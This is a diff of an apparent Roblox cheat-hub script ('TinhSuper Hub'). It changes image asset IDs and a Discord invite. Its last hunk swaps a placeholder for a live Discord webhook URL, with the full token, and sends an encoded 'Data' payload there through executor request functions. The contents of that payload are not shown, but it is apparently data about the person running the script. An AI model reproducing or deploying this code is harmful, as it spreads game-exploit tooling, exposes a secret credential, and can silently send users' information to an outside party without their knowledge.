@@ -3385,7 +3385,7 @@ ImageButton.BorderSizePixel = 0
 ImageButton.Position = UDim2.new(0.120833337 - 0.10, 0, 0.0952890813 + 0.01, 0)
 ImageButton.Size = UDim2.new(0, 50, 0, 50)
 ImageButton.Draggable = true
-ImageButton.Image = "rbxassetid://100306458933414"
+ImageButton.Image = "rbxassetid://91978763568989"
 
 UICorner.CornerRadius = UDim.new(1, 0)
 UICorner.Parent = ImageButton
@@ -3441,7 +3441,7 @@ function CircleClick(Button, X, Y)
 				Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 				Circle.BackgroundTransparency = 1.000
 				Circle.ZIndex = 10
-				Circle.Image = "rbxassetid://100306458933414"
+				Circle.Image = "rbxassetid://91978763568989"
 				Circle.ImageColor3 = Color3.fromRGB(255, 255, 255)
 				Circle.ImageTransparency = 0.7
 				local NewX = X - Circle.AbsolutePosition.X
@@ -3647,7 +3647,7 @@ end)
 
 -- Click event: copy Discord link
 Discord.MouseButton1Click:Connect(function()
-    (setclipboard or toclipboard)("https://discord.gg/vtgWe5V9bd")
+    (setclipboard or toclipboard)("https://discord.gg/Av2SM8wPCD")
     wait(.1)
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = " TinhSuper Hub ",
@@ -11904,7 +11904,7 @@ local Data = {
 local Headers = {["Content-Type"] = "application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 
-local WebhookURL = "https://discord.gg/vtgWe5V9bd"
+local WebhookURL = "https://discordapp.com/api/webhooks/1459399998457253898/0OuqxG7FwFp2FsDlGuniEtNgL4mSju_QIDZ-0O5an_OmuI1XdFpfhAVvoVcsTH5MR8Lx"
 local Request = http_request or request or HttpPost or syn.request
 if Request then
     Request({Url = WebhookURL, Body = Encoded, Method = "POST", Headers = Headers})
